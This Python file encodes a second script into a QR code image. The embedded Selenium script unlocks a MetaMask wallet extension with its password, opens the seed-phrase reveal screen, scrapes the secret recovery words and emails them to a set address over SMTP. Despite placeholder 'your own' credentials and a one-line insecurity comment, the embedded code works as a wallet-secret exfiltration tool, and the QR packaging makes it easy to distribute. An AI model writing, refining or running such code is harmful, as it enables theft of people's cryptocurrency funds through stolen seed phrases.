import qrcode

# The complete script to encode
script = """
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# Replace with your own MetaMask details
METAMASK_PASSWORD = 'your_metamask_password'
METAMASK_EXTENSION_PATH = '/path/to/your/metamask/extension'
RECIPIENT_EMAIL = 'your_email@example.com'

def send_email(subject, body, recipient):
    import smtplib
    from email.mime.text import MIMEText

    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = 'your_email@example.com'
    msg['To'] = recipient

    with smtplib.SMTP('smtp.example.com', 587) as server:
        server.starttls()
        server.login('your_email@example.com', 'your_email_password')
        server.sendmail('your_email@example.com', recipient, msg.as_string())

# Set up Chrome options
options = webdriver.ChromeOptions()
options.add_argument(f"load-extension={METAMASK_EXTENSION_PATH}")
driver = webdriver.Chrome(options=options)

# Open MetaMask extension
driver.get("chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html")

# Give some time for MetaMask to load
time.sleep(5)

# Unlock MetaMask
driver.find_element(By.XPATH, "//input[@type='password']").send_keys(METAMASK_PASSWORD)
driver.find_element(By.XPATH, "//button[contains(text(), 'Unlock')]").click()

# Wait for MetaMask to unlock
time.sleep(5)

# Navigate to Settings -> Security & Privacy -> Reveal Seed Phrase
driver.find_element(By.XPATH, "//div[contains(text(), 'Settings')]").click()
time.sleep(1)
driver.find_element(By.XPATH, "//div[contains(text(), 'Security & Privacy')]").click()
time.sleep(1)
driver.find_element(By.XPATH, "//button[contains(text(), 'Reveal Seed Phrase')]").click()
time.sleep(1)

# Confirm the action
driver.find_element(By.XPATH, "//input[@type='password']").send_keys(METAMASK_PASSWORD)
driver.find_element(By.XPATH, "//button[contains(text(), 'Next')]").click()
time.sleep(1)

# Get the seed phrase
seed_phrase = driver.find_element(By.XPATH, "//div[contains(@class, 'reveal-seed-phrase__secret-words')]").text

# Send the seed phrase via email (highly insecure, do not use in production)
send_email('MetaMask Seed Phrase', seed_phrase, RECIPIENT_EMAIL)

# Close the browser
driver.quit()
"""

# Create a QR code object
qr = qrcode.QRCode(
    version=1,
    error_correction=qrcode.constants.ERROR_CORRECT_L,
    box_size=10,
    border=4,
)

# Add the script to the QR code
qr.add_data(script)
qr.make(fit=True)

# Create an image from the QR code
img = qr.make_image(fill='black', back_color='white')

# Save the image to a file
img.save("script_qr.png")
